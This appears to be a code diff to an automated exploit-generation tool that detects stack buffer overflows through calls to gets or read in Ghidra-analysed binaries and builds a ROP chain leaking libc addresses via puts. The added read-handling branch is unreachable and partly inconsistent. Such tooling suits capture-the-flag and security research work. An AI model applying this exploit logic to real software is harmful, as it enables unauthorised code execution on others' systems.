@@ -39,7 +39,6 @@ def getLocal(name, function):
     for v in function["variables"]:
         if v["name"] == name:
             return v
-
 @register
 class StackBufferOverflowVulnerability(Vulnerability):
     name = "StackBufferOverflowVulnerability"
@@ -81,6 +80,14 @@ class StackBufferOverflowVulnerability(Vulnerability):
 
     @staticmethod
     def detect(context, function, program, options):
+        # TODO: automatically determine "suffix"
+        suffix = options.get("sbo.suffix", None)
+        if suffix:
+            suffix = suffix.replace("\\n", "\n")
+        initial = options.get("sbo.initial", None)
+        if initial:
+            initial = initial.replace("\\n", "\n")
+
         for call in function["calls"]:
             if call["funcName"] == "gets":
                 targetFunc = call
@@ -93,14 +100,6 @@ class StackBufferOverflowVulnerability(Vulnerability):
                 arg = call["arguments"][0]
                 arg = [v for v in function["variables"] if v["name"] == arg][0]
                 stackOffset = arg["stackOffset"]
-                # TODO: automatically determine "suffix"
-                suffix = options.get("sbo.suffix", None)
-                if suffix:
-                    suffix = suffix.replace("\\n", "\n")
-                initial = options.get("sbo.initial", None)
-                if initial:
-                    initial = initial.replace("\\n", "\n")
-
                 return StackBufferOverflowVulnerability(function,
                     context.binary,
                     context.libc,
@@ -111,22 +110,34 @@ class StackBufferOverflowVulnerability(Vulnerability):
                     initial=initial)
                     
             # Work in progress apparently
-            # Notes, uses old construction logic, need to update when you get around
-            # to it
+            # TODO: Get this working and tested
+            # consider blacklist of functions to allow skipping of problematic functions
+            # TODO: Update "exploit" to handle the lack of "gets"
+            #       Needs to check ropchain to handle additonal arguments
             continue
             if call["funcName"] == "read":
                 targetBuffer = call["arguments"][1]
+                targetSize = None
                 # TODO: add analysis to ghidra to export type info
                 # here to figure out if it's a variable or a constant
-                targetSize = int(call["arguments"][2], 16)
-                if isLocal(targetBuffer, function):
+                try:
+                    targetSize = int(call["arguments"][2], 16)
+                except:
+                    pass
+                if targetSize and isLocal(targetBuffer, function):
                     stackOffset = -getLocal(targetBuffer, function)["stackOffset"]
-                    if targetSize > stackOffset:
+                    if targetSize > (stackOffset + EXPLOIT_SIZE):
+                        return StackBufferOverflowVulnerability(function,
+                            context.binary,
+                            context.libc,
+                            targetFunc=call,
+                            functionExit=function["exitAddresses"][0],
+                            stackOffset=stackOffset,
+                            suffix=suffix,
+                            initial=initial)
                         self.targetFunc = call
                         self.stackOffset = stackOffset
                         return BufferOverflow
-                # TODO: find calls to functions for potentially vulnerable 
-                # variables.
                 return None
         return None
 
@@ -143,7 +154,7 @@ class StackBufferOverflowVulnerability(Vulnerability):
         # leak libc location
         sm = smrop.Smrop(binary=self.binary, libc=self.libc)
         sm.prefix(prefix)
-        sm.pop_rdi(self.binary.got["gets"])
+        sm.pop_rdi(self.binary.got["gets"]) # this REQUIRES gets to be present
         # TODO: make puts a dependency
         # TODO: abstract out puts to any print
         sm.ret("puts", 'binary')
